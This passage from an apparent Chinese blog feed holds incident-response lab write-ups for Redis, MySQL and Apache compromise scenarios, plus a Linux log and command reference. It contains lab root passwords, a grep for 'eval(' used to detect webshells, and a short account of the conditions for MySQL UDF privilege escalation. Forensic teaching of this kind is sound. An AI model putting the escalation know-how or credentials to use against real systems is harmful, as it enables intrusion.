        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">by：https://xj.edisec.net/challenges/22</span><br><span class="line">服务器场景操作系统 Linux</span><br><span class="line">服务器账号密码 root xjredis</span><br><span class="line">任务环境说明</span><br><span class="line">    注：样本请勿在本地运行！！！样本请勿在本地运行！！！样本请勿在本地运行！！！</span><br><span class="line">    应急响应工程师小王某人收到安全设备告警服务器被植入恶意文件，请上机排查</span><br><span class="line">    </span><br><span class="line">1.通过本地 PC SSH到服务器并且分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交;</span><br><span class="line">2.通过本地 PC SSH到服务器并且分析黑客第一次上传的恶意文件,将黑客上传的恶意文件里面的 FLAG 提交;</span><br><span class="line">3.通过本地 PC SSH到服务器并且分析黑客反弹 shell 的IP 为多少,将反弹 shell 的IP 作为 FLAG 提交;</span><br><span class="line">4.通过本地 PC SSH到服务器并且溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串(flag&#123;黑客的用户-关键字符串&#125; 注关键字符串 xxx-xxx-xxx)。将用户名和关键字符串作为 FLAG提交</span><br><span class="line">5.通过本地 PC SSH到服务器并且分析黑客篡改的命令,将黑客篡改的命令里面的关键字符串作为 FLAG 提交;</span><br></pre></td></tr></table></figure><h3 id="1-通过本地-PC-SSH到服务器并且分析黑客攻击成功的-IP-为多少-将黑客-IP-作为-FLAG-提交"><a href="#1-通过本地-PC-SSH到服务器并且分析黑客攻击成功的-IP-为多少-将黑客-IP-作为-FLAG-提交" class="headerlink" title="1.通过本地 PC SSH到服务器并且分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交;"></a>1.通过本地 PC SSH到服务器并且分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交;</h3><p>查看 redis日志</p><p><code>cat /var/log/redis.log</code></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240704214410827.png" alt="image-20240704214410827"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">192.168.100.13出现次数较多明显是爆破</span><br><span class="line">192.168.100.20是主从复制</span><br><span class="line">flag&#123;192.168.100.20&#125;</span><br></pre></td></tr></table></figure><h3 id="2-通过本地-PC-SSH到服务器并且分析黑客第一次上传的恶意文件-将黑客上传的恶意文件里面的-FLAG-提交"><a href="#2-通过本地-PC-SSH到服务器并且分析黑客第一次上传的恶意文件-将黑客上传的恶意文件里面的-FLAG-提交" class="headerlink" title="2.通过本地 PC SSH到服务器并且分析黑客第一次上传的恶意文件,将黑客上传的恶意文件里面的 FLAG 提交;"></a>2.通过本地 PC SSH到服务器并且分析黑客第一次上传的恶意文件,将黑客上传的恶意文件里面的 FLAG 提交;</h3><p>由于查看日志中加载了exp.so  故定位一下 exp.so的位置</p><p><code>find / -name exp.so</code></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240704214805798.png" alt="image-20240704214805798"></p><p><code>strings /exp.so |grep &quot;flag&quot;</code></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240704215000474.png" alt="image-20240704215000474"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;XJ_78f012d7-42fc-49a8-8a8c-e74c87ea109b&#125;</span><br></pre></td></tr></table></figure><h3 id="3-通过本地-PC-SSH到服务器并且分析黑客反弹-shell-的IP-为多少-将反弹-shell-的IP-作为-FLAG-提交"><a href="#3-通过本地-PC-SSH到服务器并且分析黑客反弹-shell-的IP-为多少-将反弹-shell-的IP-作为-FLAG-提交" class="headerlink" title="3.通过本地 PC SSH到服务器并且分析黑客反弹 shell 的IP 为多少,将反弹 shell 的IP 作为 FLAG 提交;"></a>3.通过本地 PC SSH到服务器并且分析黑客反弹 shell 的IP 为多少,将反弹 shell 的IP 作为 FLAG 提交;</h3><p><code>crontab -l</code></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240704215319446.png" alt="image-20240704215319446"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">通过计划任务反弹shell</span><br><span class="line">flag&#123;192.168.100.13&#125;</span><br></pre></td></tr></table></figure><h3 id="4-通过本地-PC-SSH到服务器并且溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串-flag-黑客的用户-关键字符串-注关键字符串-xxx-xxx-xxx-。将用户名和关键字符串作为-FLAG提交"><a href="#4-通过本地-PC-SSH到服务器并且溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串-flag-黑客的用户-关键字符串-注关键字符串-xxx-xxx-xxx-。将用户名和关键字符串作为-FLAG提交" class="headerlink" title="4.通过本地 PC SSH到服务器并且溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串(flag{黑客的用户-关键字符串} 注关键字符串 xxx-xxx-xxx)。将用户名和关键字符串作为 FLAG提交"></a>4.通过本地 PC SSH到服务器并且溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串(flag{黑客的用户-关键字符串} 注关键字符串 xxx-xxx-xxx)。将用户名和关键字符串作为 FLAG提交</h3><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240704215703944.png" alt="image-20240704215703944"></p><p> <img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240704215838677.png" alt="image-20240704215838677"></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240704220353417.png" alt="image-20240704220353417"></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240704220331221.png" alt="image-20240704220331221"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;xj-test-user-wow-you-find-flag&#125;</span><br></pre></td></tr></table></figure><h3 id="5-通过本地-PC-SSH到服务器并且分析黑客篡改的命令-将黑客篡改的命令里面的关键字符串作为-FLAG-提交"><a href="#5-通过本地-PC-SSH到服务器并且分析黑客篡改的命令-将黑客篡改的命令里面的关键字符串作为-FLAG-提交" class="headerlink" title="5.通过本地 PC SSH到服务器并且分析黑客篡改的命令,将黑客篡改的命令里面的关键字符串作为 FLAG 提交;"></a>5.通过本地 PC SSH到服务器并且分析黑客篡改的命令,将黑客篡改的命令里面的关键字符串作为 FLAG 提交;</h3><p>黑客篡改了命令<br>linux命令存放在 &#x2F;usr&#x2F;bin 中</p><p><code>ls -alt /usr/bin/</code></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240704221652160.png" alt="image-20240704221652160">尝试根据时间排序 便于快速定位<br>很显然是ps命令<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240704221933252.png" alt="image-20240704221933252"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;c195i2923381905517d818e313792d196&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>第二章-日志分析-mysql应急响应</title>
      <link href="/2024/07/04/%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-mysql%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
      <url>/2024/07/04/%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-mysql%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">by:https://xj.edisec.net/challenges/23</span><br><span class="line">mysql应急响应 ssh账号 root  密码 xjmysql</span><br><span class="line">ssh env.xj.edisec.net  -p xxxxx</span><br><span class="line">1.黑客第一次写入的shell flag&#123;关键字符串&#125; </span><br><span class="line">2.黑客反弹shell的ip flag&#123;ip&#125;</span><br><span class="line">3.黑客提权文件的完整路径 md5 flag&#123;md5&#125; 注 /xxx/xxx/xxx/xxx/xxx.xx</span><br><span class="line">4.黑客获取的权限 flag&#123;whoami后的值&#125;</span><br></pre></td></tr></table></figure><h3 id="1-黑客第一次写入的shell-flag-关键字符串"><a href="#1-黑客第一次写入的shell-flag-关键字符串" class="headerlink" title="1.黑客第一次写入的shell flag{关键字符串}"></a>1.黑客第一次写入的shell flag{关键字符串}</h3><p><code>find / -name &quot;*.php&quot;|xargs grep &quot;eval(&quot;</code></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240704200347159.png" alt="image-20240704200347159"></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240704200407664.png" alt="image-20240704200407664"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查看文件得到flag</span><br><span class="line">flag&#123;ccfda79e-7aa1-4275-bc26-a6189eb9a20b&#125;</span><br></pre></td></tr></table></figure><h3 id="2-黑客反弹shell的ip-flag-ip"><a href="#2-黑客反弹shell的ip-flag-ip" class="headerlink" title="2.黑客反弹shell的ip flag{ip}"></a>2.黑客反弹shell的ip flag{ip}</h3><p><code>cat /var/log/apache2/access.log</code></p><p>探查日志</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240704204029006.png" alt="image-20240704204029006"></p><p>可以看到  写了一个 1.sh 进去 且 bash运行了这个命令<br>解码或者直接查看文件，是一个反弹shell的payload<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240704204203848.png" alt="image-20240704204203848"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;192.168.100.13&#125;</span><br></pre></td></tr></table></figure><h3 id="3-黑客提权文件的完整路径-md5-flag-md5"><a href="#3-黑客提权文件的完整路径-md5-flag-md5" class="headerlink" title="3.黑客提权文件的完整路径 md5 flag{md5}"></a>3.黑客提权文件的完整路径 md5 flag{md5}</h3><h4 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h4><p>UDF（Userdefined function）可翻译为用户自定义函数，其为 mysql 的一个拓展接口，可以为 mysql 增添一些函数。比如 mysql 一些函数没有，我就使用 UDF 加入一些函数进去，那么我就可以在 mysql 中使用这个函数了</p><blockquote><p>条件：</p><p>获取了MySQL控制权：获取到账号密码，并且可以远程连接</p><p>获取到的账户具有写入权限，即secure_file_priv值为空</p><p>什么情况下需使用mysql提权？</p><p>拿到了mysql的权限，但是没拿到mysql所在服务器的任何权限，通过mysql提权，将mysql权限提升到操作系统权限</p></blockquote><p>提权 首先需要知道密码 尝试是否有文件泄露出密码</p><p><code>find / -name &quot;*.php&quot; | xargs grep &quot;root&quot;</code></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240704204524180.png" alt="image-20240704204524180"></p><p>登录到数据库 探查是否具备条件</p><p><code>show global variables like &#39;%secure%&#39;;</code></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240704205408473.png" alt="image-20240704205408473"><br>查到secure_file_priv字段为空，具有写入权限<br>一般进行了提权，一定会在&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;目录下留下痕迹</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240704205809919.png" alt="image-20240704205809919"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;b1818bde4e310f3d23f1005185b973e7&#125;</span><br></pre></td></tr></table></figure><h3 id="4-黑客获取的权限-flag-whoami后的值"><a href="#4-黑客获取的权限-flag-whoami后的值" class="headerlink" title="4.黑客获取的权限 flag{whoami后的值}"></a>4.黑客获取的权限 flag{whoami后的值}</h3><p><code>ps -aux</code></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240704210545999.png" alt="image-20240704210545999"></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240704211056716.png" alt="image-20240704211056716"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查看进程权限 可知 黑客获取的权限为mysql</span><br><span class="line">flag&#123;mysql&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>第二章-日志分析-apache日志分析</title>
      <link href="/2024/07/04/%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-apache%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
      <url>/2024/07/04/%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-apache%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">by:https://xj.edisec.net/challenges/29</span><br><span class="line">账号密码 root apacherizhi</span><br><span class="line">ssh root@IP</span><br><span class="line">1.提交当天访问次数最多的IP，即黑客IP</span><br><span class="line">2.黑客使用的浏览器指纹是什么，提交指纹的md5</span><br><span class="line">3.查看index.php页面被访问的次数，提交次数</span><br><span class="line">4.查看黑客IP访问了多少次，提交次数</span><br><span class="line">5.查看2023年8月03日8时这一个小时内有多少IP访问，提交次数</span><br></pre></td></tr></table></figure><p>Apache日志路径一般在：</p><ul><li>&#x2F;var&#x2F;log&#x2F;apache&#x2F;access.log</li><li>&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log</li><li>&#x2F;var&#x2F;log&#x2F;httpd&#x2F;access.log</li></ul><blockquote><p>该题Apache日志在&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log<br>我已经将其下载到本地进行分析</p></blockquote><h3 id="1-提交当天访问次数最多的IP，即黑客IP"><a href="#1-提交当天访问次数最多的IP，即黑客IP" class="headerlink" title="1.提交当天访问次数最多的IP，即黑客IP"></a>1.提交当天访问次数最多的IP，即黑客IP</h3><p><code>awk &#39;&#123;print $1&#125;&#39; access.log.1 |sort|uniq -c|sort -nr</code></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240704143245623.png" alt="image-20240704143245623"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">访问了6555次 根据题意黑客ip为192.168.200.2</span><br><span class="line">flag&#123;192.168.200.2&#125;</span><br></pre></td></tr></table></figure><h3 id="2-黑客使用的浏览器指纹是什么，提交指纹的md5"><a href="#2-黑客使用的浏览器指纹是什么，提交指纹的md5" class="headerlink" title="2.黑客使用的浏览器指纹是什么，提交指纹的md5"></a>2.黑客使用的浏览器指纹是什么，提交指纹的md5</h3><p>根据上题可知黑客IP</p><p><code>grep &quot;192.168.200.2&quot; access.log.1|awk -F &quot;\&quot;&quot; &#39;&#123;print $6&#125;&#39;|sort|uniq -c</code></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240704152149452.png" alt="image-20240704152149452"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">过滤 然后去重 得到两个 md5即可获得flag</span><br><span class="line">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">flag&#123;2d6330f380f44ac20f3a02eed0958f66&#125;</span><br></pre></td></tr></table></figure><h3 id="3-查看index-php页面被访问的次数，提交次数"><a href="#3-查看index-php页面被访问的次数，提交次数" class="headerlink" title="3.查看index.php页面被访问的次数，提交次数"></a>3.查看index.php页面被访问的次数，提交次数</h3><p><code>grep &quot;/index.php&quot; access.log.1|wc -l</code></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240704160414582.png" alt="image-20240704160414582"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;27&#125;</span><br></pre></td></tr></table></figure><h3 id="4-查看黑客IP访问了多少次，提交次数"><a href="#4-查看黑客IP访问了多少次，提交次数" class="headerlink" title="4.查看黑客IP访问了多少次，提交次数"></a>4.查看黑客IP访问了多少次，提交次数</h3><p><code>grep -w &quot;192.168.200.2&quot; access.log.1|wc -l</code></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240704165145768.png" alt="image-20240704165145768"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">第一题其实就已经有了</span><br><span class="line">两次结果不同在于 直接grep 是模糊匹配 含有192.168.200.2</span><br><span class="line">192.168.200.211 也会匹配到  -w 为完全匹配</span><br><span class="line">flag&#123;6555&#125;</span><br></pre></td></tr></table></figure><h3 id="5-查看2023年8月03日8时这一个小时内有多少IP访问，提交次数"><a href="#5-查看2023年8月03日8时这一个小时内有多少IP访问，提交次数" class="headerlink" title="5.查看2023年8月03日8时这一个小时内有多少IP访问，提交次数"></a>5.查看2023年8月03日8时这一个小时内有多少IP访问，提交次数</h3><p><code>awk &#39;&#123;print $4,$1&#125;&#39; access.log.1|grep 03/Aug/2023:08 |awk &#39;&#123;print $2&#125;&#39;|sort|uniq</code></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240704170039060.png" alt="image-20240704170039060"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux日志分析及常用命令总结</title>
      <link href="/2024/07/03/Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E5%8F%8A%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/"/>
      <url>/2024/07/03/Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E5%8F%8A%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h3 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h3><p>在Linux系统下，日志默认存放位置目录为：&#x2F;var&#x2F;log&#x2F;<br>系统日志配置文件：&#x2F;etc&#x2F;rsyslog.conf</p><p>相关文件关系如下表：</p><table><thead><tr><th>日志文件</th><th>文件说明</th></tr></thead><tbody><tr><td>&#x2F;var&#x2F;log&#x2F;cron</td><td>记录了系统定时任务相关的日志</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;cups</td><td>记录打印信息的日志</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;dmesg</td><td>记录了系统在开机时内检的信息，也可以使用dmesg命令直接查看内核自检信息</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;maillog</td><td>记录邮件信息</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;message</td><td>记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;btmp</td><td>记录错误登录日志，这个文件是二进制文件，不能直接vim查看，而要使用lastb命令查看</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;lastlog</td><td>记录系统中所有用户最后一次登陆时间的日志，这个文件是二进制文件，不能直接vim，而要使用lastlog命令查看</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;wtmp</td><td>永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vim，而需要使用last命令来查看</td></tr><tr><td>&#x2F;var&#x2F;run&#x2F;utmp</td><td>记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vim，而要使用w，who，users等命令来查询</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;secure</td><td>记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</td></tr></tbody></table><p>比较重要的几个日志：<br>登录失败日志：&#x2F;var&#x2F;log&#x2F;btmp,对应命令：lastb<br>最后一次登录：&#x2F;var&#x2F;log&#x2F;lastlog,对应命令：lastlog<br>登录成功记录：&#x2F;var&#x2F;log&#x2F;wtmp,对应命令：last<br>登录日志记录：&#x2F;var&#x2F;log&#x2F;secure<br>目前登录用户信息：&#x2F;var&#x2F;run&#x2F;utmp,对应命令：w、who、users</p><h3 id="grep、awk、sort、uniq等命令"><a href="#grep、awk、sort、uniq等命令" class="headerlink" title="grep、awk、sort、uniq等命令"></a>grep、awk、sort、uniq等命令</h3><h4 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">grep参数：</span><br><span class="line">-a 不要忽略二进制数据。</span><br><span class="line">-i：在搜索的时候忽略大小写</span><br><span class="line">-n：显示结果所在行号</span><br><span class="line">-c：统计匹配到的行数，注意，是匹配到的总行数，不是匹配到的次数</span><br><span class="line">-o：只显示符合条件的字符串，但是不整行显示，每个符合条件的字符串单独显示一行</span><br><span class="line">-v：输出不带关键字的行（反向查询，反向匹配）</span><br><span class="line">-w：匹配整个单词，如果是字符串中包含这个单词，则不作匹配</span><br><span class="line">-Ax：在输出的时候包含结果所在行之后的指定行数，这里指之后的x行，A：after</span><br><span class="line">-Bx：在输出的时候包含结果所在行之前的指定行数，这里指之前的x行，B：before</span><br><span class="line">-Cx：在输出的时候包含结果所在行之前和之后的指定行数，这里指之前和之后的x行，C：context</span><br><span class="line">-e：实现多个选项的匹配，逻辑or关系</span><br><span class="line">-q：静默模式，不输出任何信息，当我们只关心有没有匹配到，却不关心匹配到什么内容时，我们可以使用此命令，然后，使用”echo $?”查看是否匹配到，0表示匹配到，1表示没有匹配到。</span><br><span class="line">-P：表示使用兼容perl的正则引擎。</span><br><span class="line">-E：使用扩展正则表达式，而不是基本正则表达式，在使用”-E”选项时，相当于使用egrep</span><br></pre></td></tr></table></figure><h4 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk是一种编程语言，用于linux下对文本和数据进行处理。数据可以来自标准输入、一个或多个文件，或其他命令的输出。</span><br></pre></td></tr></table></figure><p><strong>更多作为脚本来使用。</strong></p><h5 id="awk处理数据的方式："><a href="#awk处理数据的方式：" class="headerlink" title="awk处理数据的方式："></a>awk处理数据的方式：</h5><p>逐行扫描文件，寻找匹配的特定模式的行，并在这些行上进行你想要的操作。如果没有指定动作，则把匹配的行显示到标准输出（屏幕）。如果没有指定模式，则所有被操作所指定的行都被处理。</p><table><thead><tr><th>参数</th><th>说明</th><th>备注</th></tr></thead><tbody><tr><td>-f</td><td>从脚本文件中读取awk命令</td><td>常用</td></tr><tr><td>-F</td><td>指定输入文件折分隔符，fs是一个字符串或者是一个正则表达式，如-F: （–field-separator）</td><td>常用</td></tr><tr><td>-v</td><td>赋值一个用户定义变量</td><td></td></tr></tbody></table><h4 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可针对文本文件的内容，以行为单位来排序</span><br></pre></td></tr></table></figure><p><code>sort [-bcdfimMnr][-o&lt;输出文件&gt;][-t&lt;分隔字符&gt;][+&lt;起始栏位&gt;-&lt;结束栏位&gt;][--help][--verison][文件][-k field1[,field2]]</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">参数说明</span><br><span class="line">-b 忽略每行前面开始出的空格字符。</span><br><span class="line">-c 检查文件是否已经按照顺序排序。</span><br><span class="line">-d 排序时，处理英文字母、数字及空格字符外，忽略其他的字符。</span><br><span class="line">-f 排序时，将小写字母视为大写字母。</span><br><span class="line">-i 排序时，除了040至176之间的ASCII字符外，忽略其他的字符。</span><br><span class="line">-m 将几个排序好的文件进行合并。</span><br><span class="line">-M 将前面3个字母依照月份的缩写进行排序。</span><br><span class="line">-n 依照数值的大小排序。</span><br><span class="line">-u 意味着是唯一的(unique)，输出的结果是去完重了的。</span><br><span class="line">-o&lt;输出文件&gt; 将排序后的结果存入指定的文件。</span><br><span class="line">-r 以相反的顺序来排序。</span><br><span class="line">-t&lt;分隔字符&gt; 指定排序时所用的栏位分隔字符。</span><br><span class="line">·+&lt;起始栏位&gt;-&lt;结束栏位&gt; 以指定的栏位来排序，范围由起始栏位到结束栏位的前一栏位。</span><br><span class="line">--help 显示帮助。</span><br><span class="line">--version 显示版本信息。</span><br><span class="line">[-k field1[,field2]] 按指定的列进行排序</span><br></pre></td></tr></table></figure><h4 id="uniq"><a href="#uniq" class="headerlink" title="uniq"></a>uniq</h4><p>使用说明：</p><p>这个命令读取输入文件，并比较相邻的行。在正常情况下，第二个及以后更多个重复行将被删去，行比较是根据所用字符集的排序序列进行的。该命令加工后的结果写到输出文件中。输入文件和输出文件必须不同。如果输入文件用“- ”表示，则从标准输入读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-c 显示输出中，在每行行首加上本行在文件中出现的次数。它可取代- u和- d选项。</span><br><span class="line">-d 只显示重复行。</span><br><span class="line">-u 只显示文件中不重复的各行。</span><br><span class="line">-n 前n个字段与每个字段前的空白一起被忽略。一个字段是一个非空格、非制表符的字符串，彼此由制表符和空格隔开(字段从0开始编号)。</span><br><span class="line">+n 前n个字符被忽略，之前的字符被跳过(字符从0开始编号)。</span><br><span class="line">-fn 与- n相同，这里n是字段数。</span><br><span class="line">-sn 与+n相同，这里n是字符数。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>帕鲁杯应急响应wp</title>
      <link href="/2024/05/06/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94wp/"/>
      <url>/2024/05/06/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94wp/</url>
      
